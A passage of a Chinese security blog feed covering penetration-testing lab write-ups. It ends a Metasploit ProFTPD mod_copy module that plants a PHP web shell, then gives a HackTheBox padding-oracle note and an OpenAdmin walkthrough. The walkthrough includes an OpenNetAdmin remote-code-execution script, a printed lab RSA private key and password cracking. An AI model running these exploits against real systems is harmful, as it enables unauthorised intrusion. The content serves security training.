class="string">&#x27;Apr 22 2015&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">    register_options(</span><br><span class="line">      [</span><br><span class="line">        OptPort.<span class="keyword">new</span>(<span class="string">&#x27;RPORT&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;HTTP port&#x27;</span>, <span class="number">80</span>]),</span><br><span class="line">        OptPort.<span class="keyword">new</span>(<span class="string">&#x27;RPORT_FTP&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;FTP port&#x27;</span>, <span class="number">21</span>]),</span><br><span class="line">        OptString.<span class="keyword">new</span>(<span class="string">&#x27;TARGETURI&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;Base path to the website&#x27;</span>, <span class="string">&#x27;/&#x27;</span>]),</span><br><span class="line">        OptString.<span class="keyword">new</span>(<span class="string">&#x27;TMPPATH&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;Absolute writable path&#x27;</span>, <span class="string">&#x27;/tmp&#x27;</span>]),</span><br><span class="line">        OptString.<span class="keyword">new</span>(<span class="string">&#x27;SITEPATH&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;Absolute writable website path&#x27;</span>, <span class="string">&#x27;/var/www&#x27;</span>])</span><br><span class="line">      ], <span class="built_in">self</span>.<span class="keyword">class</span>)</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def check</span><br><span class="line">    ftp_port = datastore[<span class="string">&#x27;RPORT_FTP&#x27;</span>]</span><br><span class="line">    sock = Rex::Socket.create_tcp(<span class="string">&#x27;PeerHost&#x27;</span> =&gt; rhost, <span class="string">&#x27;PeerPort&#x27;</span> =&gt; ftp_port)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sock.nil?</span><br><span class="line">      fail_with(Failure::Unreachable, <span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failed to connect to FTP server&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      print_status(<span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Connected to FTP server&quot;</span>)</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    res = sock.get_once(<span class="number">-1</span>, <span class="number">10</span>)</span><br><span class="line">    unless res &amp;&amp; res.<span class="keyword">include</span>?(<span class="string">&#x27;220&#x27;</span>)</span><br><span class="line">      fail_with(Failure::Unknown, <span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure retrieving ProFTPD 220 OK banner&quot;</span>)</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    sock.puts(<span class="string">&quot;SITE CPFR /etc/passwd\r\n&quot;</span>)</span><br><span class="line">    res = sock.get_once(<span class="number">-1</span>, <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> res &amp;&amp; res.<span class="keyword">include</span>?(<span class="string">&#x27;350&#x27;</span>)</span><br><span class="line">      Exploit::CheckCode::Vulnerable</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      Exploit::CheckCode::Safe</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def exploit</span><br><span class="line">    ftp_port = datastore[<span class="string">&#x27;RPORT_FTP&#x27;</span>]</span><br><span class="line">    get_arg = rand_text_alphanumeric(<span class="number">5</span>+rand(<span class="number">3</span>))</span><br><span class="line">    payload_name = rand_text_alphanumeric(<span class="number">5</span>+rand(<span class="number">3</span>)) + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"></span><br><span class="line">    sock = Rex::Socket.create_tcp(<span class="string">&#x27;PeerHost&#x27;</span> =&gt; rhost, <span class="string">&#x27;PeerPort&#x27;</span> =&gt; ftp_port)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sock.nil?</span><br><span class="line">      fail_with(Failure::Unreachable, <span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failed to connect to FTP server&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      print_status(<span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Connected to FTP server&quot;</span>)</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    res = sock.get_once(<span class="number">-1</span>, <span class="number">10</span>)</span><br><span class="line">    unless res &amp;&amp; res.<span class="keyword">include</span>?(<span class="string">&#x27;220&#x27;</span>)</span><br><span class="line">      fail_with(Failure::Unknown, <span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure retrieving ProFTPD 220 OK banner&quot;</span>)</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    print_status(<span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Sending copy commands to FTP server&quot;</span>)</span><br><span class="line"></span><br><span class="line">    sock.puts(<span class="string">&quot;SITE CPFR /proc/self/cmdline\r\n&quot;</span>)</span><br><span class="line">    res = sock.get_once(<span class="number">-1</span>, <span class="number">10</span>)</span><br><span class="line">    unless res &amp;&amp; res.<span class="keyword">include</span>?(<span class="string">&#x27;350&#x27;</span>)</span><br><span class="line">      fail_with(Failure::Unknown, <span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure copying from /proc/self/cmdline&quot;</span>)</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    sock.put(<span class="string">&quot;SITE CPTO #&#123;datastore[&#x27;TMPPATH&#x27;]&#125;/.&lt;?php passthru(<span class="subst">$_GET</span>[\&#x27;#&#123;get_arg&#125;\&#x27;]);?&gt;\r\n&quot;</span>)</span><br><span class="line">    res = sock.get_once(<span class="number">-1</span>, <span class="number">10</span>)</span><br><span class="line">    unless res &amp;&amp; res.<span class="keyword">include</span>?(<span class="string">&#x27;250&#x27;</span>)</span><br><span class="line">      fail_with(Failure::Unknown, <span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure copying to temporary payload file&quot;</span>)</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    sock.put(<span class="string">&quot;SITE CPFR #&#123;datastore[&#x27;TMPPATH&#x27;]&#125;/.&lt;?php passthru(<span class="subst">$_GET</span>[\&#x27;#&#123;get_arg&#125;\&#x27;]);?&gt;\r\n&quot;</span>)</span><br><span class="line">    res = sock.get_once(<span class="number">-1</span>, <span class="number">10</span>)</span><br><span class="line">    unless res &amp;&amp; res.<span class="keyword">include</span>?(<span class="string">&#x27;350&#x27;</span>)</span><br><span class="line">      fail_with(Failure::Unknown, <span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure copying from temporary payload file&quot;</span>)</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    sock.put(<span class="string">&quot;SITE CPTO #&#123;datastore[&#x27;SITEPATH&#x27;]&#125;/#&#123;payload_name&#125;\r\n&quot;</span>)</span><br><span class="line">    res = sock.get_once(<span class="number">-1</span>, <span class="number">10</span>)</span><br><span class="line">    unless res &amp;&amp; res.<span class="keyword">include</span>?(<span class="string">&#x27;250&#x27;</span>)</span><br><span class="line">      fail_with(Failure::Unknown, <span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure copying PHP payload to website path, directory not writable?&quot;</span>)</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    sock.close</span><br><span class="line"></span><br><span class="line">    print_status(<span class="string">&quot;#&#123;peer&#125; - Executing PHP payload #&#123;target_uri.path&#125;#&#123;payload_name&#125;&quot;</span>)</span><br><span class="line">    res = send_request_cgi!(</span><br><span class="line">      <span class="string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, payload_name),</span><br><span class="line">      <span class="string">&#x27;method&#x27;</span> =&gt; <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;vars_get&#x27;</span> =&gt; &#123; get_arg =&gt; <span class="string">&quot;nohup #&#123;payload.encoded&#125; &amp;&quot;</span> &#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    unless res &amp;&amp; res.code == <span class="number">200</span></span><br><span class="line">      fail_with(Failure::Unknown, <span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure executing payload&quot;</span>)</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>靶机</category>
        <category>VulnHub</category>
      </categories>
      <tags>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HackTheBox-Challenge-Web</title>
    <url>/Target_drone/HackTheBox/0.HackTheBox-Challenge-Web/</url>
    <content><![CDATA[<h1 id="HackTheBox-Challenge-Web">HackTheBox Challenge Web</h1>
<h2 id="I-know-Mag1k">I know Mag1k</h2>
<p>打开题目有登录注册的页面，先随便注册一个账号</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200715113402.png" alt=""></p>
<p>有一个cookie很奇怪，感觉像是base64编码</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200715113528.png" alt=""></p>
<p>这个地方就涉及到Padding Oracle attacks（填充提示攻击），很多年前的攻击方式了，《白帽子讲web安全》中有提到过这种攻击手法。</p>
<p>直接使用工具padbuster。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">padbuster http:&#x2F;&#x2F;docker.hackthebox.eu:30921&#x2F;profile.php Y5MXsRyBPFqBPlu3z8p7S2OO%2FGe9sLQ5X1khXeMdHfkcsgbngE3xDA%3D%3D 8 --cookies iknowmag1k&#x3D;Y5MXsRyBPFqBPlu3z8p7S2OO%2FGe9sLQ5X1khXeMdHfkcsgbngE3xDA%3D%3D</span><br></pre></td></tr></table></figure>
<blockquote>
<p>其中这个命令参数8指的是解密的块大小，一共只有三个值：8，16，32</p>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::OpenAdmin Walkthrough</title>
    <url>/Target_drone/HackTheBox/1.HTB-OpenAdmin-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-OpenAdmin-Walkthrough">HTB::OpenAdmin Walkthrough</h1>
<h2 id="0x01-基本信息">0x01 基本信息</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200207184103.png" alt=""></p>
<h2 id="0x02-使用工具和知识点">0x02 使用工具和知识点</h2>
<ul>
<li>nmap</li>
<li>dirbuster</li>
<li><a href="http://ssh2john.py">ssh2john.py</a></li>
<li>john</li>
<li>opennetadmin v18.1.1 exploit</li>
<li>netstat -tulpn</li>
<li>nano</li>
</ul>
<h2 id="0x03-渗透测试过程">0x03 渗透测试过程</h2>
<h3 id="端口探测">端口探测</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ca01h:~<span class="comment"># nmap -sC -sV -T5 10.10.10.171</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-07 18:31 HKT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.171</span><br><span class="line">Host is up (0.14s latency).</span><br><span class="line">Not shown: 996 filtered ports</span><br><span class="line">PORT     STATE  SERVICE    VERSION</span><br><span class="line">22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:<span class="built_in">cd</span>:bc:92:00:b7:54 (RSA)</span><br><span class="line">|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)</span><br><span class="line">|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)</span><br><span class="line">80/tcp   open   http       Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">993/tcp  closed imaps</span><br><span class="line">1025/tcp closed NFS-or-IIS</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 76.12 seconds</span><br></pre></td></tr></table></figure>
<p>目标靶机开放了22 SSH和80 HTTP端口，其中80端口上运行着Apache服务，我们在浏览器中直接访问该端口，发现是Apache的默认起始页：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200207184639.png" alt=""></p>
<h3 id="目录探测">目录探测</h3>
<p>使用DirBuster工具和Kali自带的字典<code>directory-list-2.3-medium.txt</code>对站点进行目录爆破：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200207190909.png" alt=""></p>
<p>DirBuster暂时就放在后台，目前爆破出来的主要是两个目录：<code>ona</code>和<code>music</code>。我们直接尝试<code>http://10.10.10.171/ona/</code>页面：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200207201240.png" alt=""></p>
<p>有一个<code>DOWNLOAD</code>链接，点进去看一下，发现是OpenNetAdmin官网，并且当前的版本号是<code>v18.1.1</code>。</p>
<blockquote>
<p>OpenNetAdmin is an opensource IP Address Management (IPAM) system.</p>
</blockquote>
<p>直接去Google一下<code>opennetadmin v18.1.1 exploit</code>，发现ExploitDB列出了两个exploit：</p>
<p><a href="https://www.exploit-db.com/exploits/47691">https://www.exploit-db.com/exploits/47691</a></p>
<p><a href="https://www.exploit-db.com/exploits/47772">https://www.exploit-db.com/exploits/47772</a></p>
<h3 id="漏洞利用">漏洞利用</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution</span></span><br><span class="line"><span class="comment"># Date: 2019-11-19</span></span><br><span class="line"><span class="comment"># Exploit Author: mattpascoe</span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://opennetadmin.com/</span></span><br><span class="line"><span class="comment"># Software Link: https://github.com/opennetadmin/ona</span></span><br><span class="line"><span class="comment"># Version: v18.1.1</span></span><br><span class="line"><span class="comment"># Tested on: Linux</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Exploit Title: OpenNetAdmin v18.1.1 RCE</span></span><br><span class="line"><span class="comment"># Date: 2019-11-19</span></span><br><span class="line"><span class="comment"># Exploit Author: mattpascoe</span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://opennetadmin.com/</span></span><br><span class="line"><span class="comment"># Software Link: https://github.com/opennetadmin/ona</span></span><br><span class="line"><span class="comment"># Version: v18.1.1</span></span><br><span class="line"><span class="comment"># Tested on: Linux</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"> </span><br><span class="line">URL=<span class="string">&quot;<span class="variable">$&#123;1&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>;<span class="keyword">do</span></span><br><span class="line"> <span class="built_in">echo</span> -n <span class="string">&quot;$ &quot;</span>; <span class="built_in">read</span> cmd</span><br><span class="line"> curl --silent -d <span class="string">&quot;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \&quot;BEGIN\&quot;;<span class="variable">$&#123;cmd&#125;</span>;echo \&quot;END\&quot;&amp;xajaxargs[]=ping&quot;</span> <span class="string">&quot;<span class="variable">$&#123;URL&#125;</span>&quot;</span> | sed -n -e <span class="string">&#x27;/BEGIN/,/END/ p&#x27;</span> | tail -n +2 | head -n -1</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>将上面的Bash脚本保存到Kali，并执行命令，可以得到反弹shell：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash ona.sh http://10.10.10.171/ona/</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200209110914.png" alt=""></p>
<p>经过测试发现，当前用户是<code>www-data</code>，不能执行<code>cd</code>命令离开当前目录，用<code>find / -type d -user www-data</code>查看有权限访问的目录。</p>
<blockquote>
<ul>
<li>find - is a linux command to find anything like file or directory.</li>
<li>The first argument i.e <code>/</code> is the place to perform the search.</li>
<li><code>-type</code>  - It takes <code>f</code> or <code>d</code> resembling what we are searching.
<ul>
<li><code>f</code> - For files</li>
<li><code>d</code> - For directories</li>
</ul>
</li>
<li><code>-user</code> - This tells in connection to which user. This command will search all the <code>files</code> that have permission for <code>www-data</code> under <code>/</code>(complete file system)</li>
</ul>
</blockquote>
<p>内容太多这里就不贴结果了，基本上就是<code>/opt/ona/www/</code>和<code>/var/www/ona/</code>两个目录，首先去看<code>config</code>配置文件：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200209112555.png" alt=""></p>
<p>查看<code>config.inc.php</code>，发现有一个数据库的配置文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Include the localized Database settings</span></span><br><span class="line">$dbconffile = <span class="string">&quot;<span class="subst">&#123;$base&#125;</span>/local/config/database_settings.inc.php&quot;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200209114426.png" alt=""></p>
<p>找到了mysql的登录用户密码：<code>n1nj4W4rri0R!</code>，再看一下<code>/var/www/</code>目录，发现有一个<code>internal</code>目录属于Jimmy用户，用Jimmy和mysql的密码登录SSH。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jimmy@openadmin:~$ <span class="built_in">cd</span> /var/www/internal</span><br><span class="line">jimmy@openadmin:/var/www/internal$ ls -la</span><br><span class="line">total 20</span><br><span class="line">drwxrwx--- 2 jimmy internal 4096 Nov 23 17:43 .</span><br><span class="line">drwxr-xr-x 4 root  root     4096 Nov 22 18:15 ..</span><br><span class="line">-rwxrwxr-x 1 jimmy internal 3229 Nov 22 23:24 index.php</span><br><span class="line">-rwxrwxr-x 1 jimmy internal  185 Nov 23 16:37 logout.php</span><br><span class="line">-rwxrwxr-x 1 jimmy internal  339 Nov 23 17:40 main.php</span><br><span class="line">jimmy@openadmin:/var/www/internal$ cat main.php</span><br><span class="line">&lt;?php session_start(); <span class="keyword">if</span> (!isset (<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123; header(<span class="string">&quot;Location: /index.php&quot;</span>); &#125;; </span><br><span class="line"><span class="comment"># Open Admin Trusted</span></span><br><span class="line"><span class="comment"># OpenAdmin</span></span><br><span class="line"><span class="variable">$output</span> = shell_exec(<span class="string">&#x27;cat /home/joanna/.ssh/id_rsa&#x27;</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="variable">$output</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;h3&gt;Don<span class="string">&#x27;t forget your &quot;ninja&quot; password&lt;/h3&gt;</span></span><br><span class="line"><span class="string">Click here to logout &lt;a href=&quot;logout.php&quot; tite = &quot;Logout&quot;&gt;Session</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>mian.php</code>文件提示通过登录认证jimmy用户输出另一个用户joanna的rsa密钥，现在我们就需要知道，这个服务运行在哪个端口上</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jimmy@openadmin:~$ curl http://localhost/main.php</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;404 Not Found&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;address&gt;Apache/2.4.29 (Ubuntu) Server at localhost Port 80&lt;/address&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>不是普通的80端口，运行<code>netstat -tulpn</code>命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">immy@openadmin:~$ netstat -tulpn</span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      -                   </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -                   </span><br><span class="line">udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>列出来的端口中最有可能的就是52846：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url http:&#x2F;&#x2F;localhost:52846&#x2F;main.php</span><br><span class="line">&lt;pre&gt;-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D</span><br><span class="line"></span><br><span class="line">kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8</span><br><span class="line">ad&#x2F;StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO</span><br><span class="line">ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE</span><br><span class="line">6xaubNKhDJKs&#x2F;6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ</span><br><span class="line">ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5&#x2F;Du</span><br><span class="line">y8byJ&#x2F;3I3&#x2F;EsqHphIHgD3UfvHy9naXc&#x2F;nLUup7s0+WAZ4AUx&#x2F;MJnJV2nN8o69JyI</span><br><span class="line">9z7V9E4q&#x2F;aKCh&#x2F;xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4</span><br><span class="line">piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv&#x2F;dEVEppvIDE&#x2F;8h&#x2F;</span><br><span class="line">&#x2F;U1cPvX9Aci0EUys3naB6pVW8i&#x2F;IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH</span><br><span class="line">40ZNca5xHPij8hvUR2v5jGM&#x2F;8bvr&#x2F;7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN&#x2F;AZ</span><br><span class="line">fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb</span><br><span class="line">9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80</span><br><span class="line">X1VZ+N7S8ZP+7djB22vQ+&#x2F;pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg</span><br><span class="line">S33lgrCM4&#x2F;ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey&#x2F;ur&#x2F;4F</span><br><span class="line">FnonsEl16TZvolSt9RH&#x2F;19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh</span><br><span class="line">Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD&#x2F;GtPmcviGCexa</span><br><span class="line">RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z</span><br><span class="line">uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA&#x2F;MxlYJ9FNDr</span><br><span class="line">1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2</span><br><span class="line">XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM&#x2F;SLhS79</span><br><span class="line">yPzCZH8uWIrjaNaZmDSPC&#x2F;z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM</span><br><span class="line">+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7&#x2F;ee6KDTl7JMdV25DM9a16JYOneRtMt</span><br><span class="line">qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt</span><br><span class="line">z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe</span><br><span class="line">K1I1cqiDbVE&#x2F;bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw&#x2F;iMKhpITWLWApA3k9EN</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line">&lt;&#x2F;pre&gt;&lt;html&gt;</span><br><span class="line">&lt;h3&gt;Don&#39;t forget your &quot;ninja&quot; password&lt;&#x2F;h3&gt;</span><br><span class="line">Click here to logout &lt;a href&#x3D;&quot;logout.php&quot; tite &#x3D; &quot;Logout&quot;&gt;Session</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p>解密rsa得到一个密码叫<code>bloodninjas</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali@kali:~/Desktop$ python /usr/share/john/ssh2john.py joanna_rsa &gt; joanna_rsa.hash</span><br><span class="line">kali@kali:~/Desktop$ /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt joanna_rsa.hash </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])</span><br><span class="line">Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Cost 2 (iteration count) is 1 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 2 OpenMP threads</span><br><span class="line">Note: This format may emit <span class="literal">false</span> positives, so it will keep trying even after</span><br><span class="line">finding a possible candidate.</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">bloodninjas      (joanna_rsa)</span><br><span class="line">1g 0:00:00:16 DONE (2020-02-09 08:19) 0.06172g/s 885290p/s 885290c/s 885290C/sa6_123..*7¡Vamos!</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
<p>经尝试这个密码并不是joanna的ssh连接密码，而是利用密钥连接ssh时对私钥的验证密码。之后连接到joanna的ssh，注意一定要将私钥的文件权限设置为700：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali@kali:~/Desktop$ chmod 700 joanna_rsa</span><br><span class="line">kali@kali:~/Desktop$ ssh -i joanna_rsa joanna@10.10.10.171</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;joanna_rsa&#x27;</span>: </span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Sun Feb  9 14:18:59 UTC 2020</span><br><span class="line"></span><br><span class="line">  System load:  1.04              Processes:             164</span><br><span class="line">  Usage of /:   49.6% of 7.81GB   Users logged <span class="keyword">in</span>:       2</span><br><span class="line">  Memory usage: 24%               IP address <span class="keyword">for</span> ens160: 10.10.10.171</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available <span class="keyword">for</span> installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line"></span><br><span class="line">41 packages can be updated.</span><br><span class="line">12 updates are security updates.</span><br><span class="line"></span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Sun Feb  9 14:17:21 2020 from 10.10.15.190</span><br><span class="line">joanna@openadmin:~$ </span><br></pre></td></tr></table></figure>
<p>接下来就可以很简单的找到<code>user.txt</code>：</p>
